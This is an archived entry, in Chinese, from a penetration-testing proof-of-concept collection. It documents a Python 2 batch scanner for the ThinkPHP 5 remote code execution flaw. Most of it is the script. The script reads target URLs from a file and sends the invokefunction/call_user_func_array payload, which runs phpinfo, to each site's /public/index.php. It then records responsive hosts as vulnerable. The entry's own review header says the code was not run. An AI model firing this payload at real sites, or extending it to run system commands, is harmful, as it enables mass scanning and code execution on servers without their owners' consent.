---
source: "Mr-xn/Penetration_Testing_POC"
product: "ThinkPHP / 控制器反射检测"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "thinkphp5命令执行"
prerequisites: "来源所述条件，未列明部分仍待核：无版本，Python2，固定App入口"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-3e4d15fe83cf0cb3c6684b3b"
entity_id: "ve-4c4c232488d0a285c48e5a24"
schema_version: "1"
canonical: "Web安全/开发框架/ThinkPHP/Thinkphp5命令执行批量验证脚本.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：无版本，Python2，固定App入口

代码与实验材料：全文与565相同，10线程、PHP Extension判据；未运行

来源证据范围：Mr-xn归档

- **适用与权限边界（1）**：误报漏报风险和前提不全；依据：phpinfo标记单一且固定/public/index.php；缺对照和分支检查。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：文章标题掩盖工具属性；依据：内容仅扫描脚本，应归工具而不是独立漏洞实体。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

### thinkphp5命令执行  

### POC检测代码   

```python
# -*- coding:UTF-8 -*-
# evn :python2

import requests
import threading
import time
import sys

class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
    def __init__(self, url, sem):
        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
        self.url = url
        self.sem = sem

    def run(self):
        parameters = "s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

        try:
            responce = requests.get(url = self.url, params = parameters,timeout=3)
            body = responce.text
            if body.find('PHP Extension') != -1:
                with open("success.txt", "a+") as f1:
                    f1.write("存在tp5远程代码执行漏洞: " + self.url + "\n")
                    print("[+] " + self.url)
            else:
                print("[-] " + self.url)
        except Exception,err:
            print("connect failed")
            pass
        self.sem.release()             #执行完函数，释放线程，线程数加1

class host(threading.Thread):          #遍历文件操作
    def __init__(self, sem):
        super(host, self).__init__()   #继承threading类的构造方法，python3的写法super().__init__()
        self.sem = sem

    def run(self):
        with open("url.txt", "r") as f:
            for host in f.readlines():
                self.sem.acquire()     #遍历一个就获得一个线程，直到达到最大
                host = host.strip()+"/public/index.php"
                host_thread = check(host, self.sem)  
                host_thread.start()    #执行check()的执行函数

if __name__ == '__main__':
    sem = threading.Semaphore(10)      #最大线程数为10个
    thread = host(sem)                 #传递sem值
    thread.start()
```

------
使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。


---

> 来源：Mr-xn/Penetration_Testing_POC
